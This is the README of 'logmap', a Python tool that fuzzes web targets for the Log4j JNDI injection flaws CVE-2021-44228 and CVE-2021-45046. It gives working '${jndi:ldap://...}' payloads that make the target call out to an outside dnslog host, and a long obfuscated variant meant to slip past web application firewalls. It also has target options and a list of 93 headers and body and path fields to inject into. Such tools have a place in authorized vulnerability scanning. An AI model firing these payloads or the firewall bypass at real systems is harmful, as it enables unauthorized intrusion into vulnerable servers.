# logmap 0.6 - Log4j jndi injection fuzz tool

Used for fuzzing to test whether there are log4j2 jndi injection vulnerabilities in header/body/path  
Use https://log.xn--9tr.com dnslog by default, If you want to use http://ceye.io, you need to modify the domain and token  
Manually edit line [#486](https://github.com/zhzyker/logmap/blob/main/logmap.py#L486) in logmap.py to modify:  
`args.ceye = ["xxxxxx.ceye.io", "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"]`  
to   
`args.ceye = ["1234567.ceye.io", "843fd6d58a8ebede756a2b991d321a5a"]`  

The default payload is `${{jndi:ldap://you-domain/path}}` Use `-w` or `-waf` to obfuscate the payload to bypass waf, it looks like:  
 `${${zod:as:-j}ndi:ldap:${MOH7P:-/}/${jUqr1:dlhUT:zX:Mu:rXx:-9}b71${6r3c:E8ExQh:a:iqML:-a}${jLR:s6xE:-7}${j:zzb:-3}d8${f:CF:DpXSA:-0}${7:2:yM:LnbSk:-1}c3199${4tPUvE:fj7:6K:xpqPQc:rCnYQB:-1}${G:Q:SET9R:u:9t0cc1:-1}${cLF:kENZON:e:p6f:-9}${y:i:abgu0:2cb:-3}6${35aUvK:40sxe:PaVK:cR:-d}${ysVe:byc:e:5nvP:9yVRko:-3}${Cm:DLU:-c}3f0b${iiuZKY:taWD:-4}${B:VK3:3BWv:L:-4}${KA6:GX:xxVWZg:-3}5.${6E50:-f}${iNN4:Ol:XLrqD:-3}${3Fh:T6:-6}e4${IAyoy:-d}${hMZgt:bmBCp9:bY6ofD:KR:-e}${6Ny3E:-b}.${K:Q:-d}n${FLlWGk:-s}.14${8M:-3}${W0u:LA5Z:N:-3}${t5FH:-.}e${GL:x0L72g:bqf9:6:pRQp:-u}${VIq:V:-.}${r:zFcvb:7hqmx:HTGO8:-o}r${n1ZHSo:w:-g}./Efti${Q3:-G}1}`   
Bypass reference: [StringObfuscator2.java](https://github.com/woodpecker-appstore/log4j-payload-generator/blob/master/src/main/java/me/gv7/woodpekcer/vuldb/StringObfuscator2.java) by https://github.com/c0ny1

Use `-c 1` or `--cve 1` to specify the payload, support: [1:CVE-2021-44228, 2:CVE-2021-45046]  

This is just a jndi injection fuzz tool, rce or others need yourself  

# Use  
```bash
zhzy@debian:~/$ pip3 install -r requirements.txt
zhzy@debian:~/$ python3 logmap.py -h
```


![banner](https://user-images.githubusercontent.com/32918050/145970843-3d5522f6-0064-4464-b7f8-48efcd41ffbc.png)  

# Options
```bash
  -u URL, --url URL     Target URL (e.g. http://example.com )
  -f FILE, --file FILE  Select a target list file (e.g. list.txt )
  -c 1, --cve 1         CVE [1:CVE-2021-44228, 2:CVE-2021-45046] default 1
  -d 1, --dns 1         Dnslog [1:log.xn--9tr.com, 2:ceye.io] default 1
  -p PAYLOAD            Custom payload (e.g. ${jndi:ldap://xx.dns.xx/} )
  -t 10                 Http timeout default 10s
  -o file               Output file
  -w, --waf             Obfuscate the payload and bypass waf
  --proxy PROXY         Proxy [socks5/socks4/http] (e.g. http://127.0.0.1:8080)
  -h, --help            Show this help message and exit
```

# Config  
There are currently 93 fuzz headers  
```
Accept
Accept-Charset
Accept-Datetime
Accept-Encoding
Accept-Language
Ali-CDN-Real-IP
Authorization
Cache-Control
Cdn-Real-Ip
Cdn-Src-Ip
CF-Connecting-IP
Client-IP
Contact
Cookie
DNT
Fastly-Client-Ip
Forwarded-For-Ip
Forwarded-For
Forwarded
Forwarded-Proto
From
If-Modified-Since
Max-Forwards
Originating-Ip
Origin
Pragma
Proxy-Client-IP
Proxy
Referer
TE
True-Client-Ip
True-Client-IP
Upgrade
User-Agent
Via
Warning
WL-Proxy-Client-IP
X-Api-Version
X-ATT-DeviceId
X-Client-IP
X-Cluster-Client-IP
X-Correlation-ID
X-Csrf-Token
X-CSRFToken
X-Do-Not-Track
X-Foo-Bar
X-Foo
X-Forwarded-By
X-Forwarded-For-Original
X-Forwarded-For
X-Forwarded-Host
X-Forwarded
X-Forwarded-Port
X-Forwarded-Protocol
X-Forwarded-Proto
X-Forwarded-Scheme
X-Forwarded-Server
X-Forwarded-Ssl
X-Forwarder-For
X-Forward-For
X-Forward-Proto
X-Frame-Options
X-From
X-Geoip-Country
X-Host
X-Http-Destinationurl
X-Http-Host-Override
X-Http-Method-Override
X-HTTP-Method-Override
X-Http-Method
X-Http-Path-Override
X-Https
X-Htx-Agent
X-Hub-Signature
X-If-Unmodified-Since
X-Imbo-Test-Config
X-Insight
X-Ip
X-Ip-Trail
X-Leakix
X-Original-URL
X-Originating-IP
X-ProxyUser-Ip
X-Real-Ip
X-Remote-Addr
X-Remote-IP
X-Requested-With
X-Request-ID
X-True-IP
X-UIDH
X-Wap-Profile
X-WAP-Profile
X-XSRF-TOKEN
```
Some body and path  
You can also modify him to add your own body  
```
payload={}
user={}
pass={}
username={}
password={}
login={}
... ...
?id={}
?username={}
... ...
```
